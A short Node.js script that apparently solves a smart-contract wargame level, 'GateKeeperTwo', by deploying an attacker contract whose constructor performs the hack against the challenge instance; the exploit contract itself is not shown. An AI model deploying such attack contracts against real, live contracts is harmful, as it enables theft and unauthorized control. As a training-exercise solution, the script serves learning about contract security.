const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load attacker contract.')
    const attacker = loader.web3.fromArtifact('HackGateKeeperTwo')

    console.log('Deploy attacker contract and perform hack at the same time...')
    await attacker.deploy({ arguments: [instance] }).send({ gas: 3000000 })

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
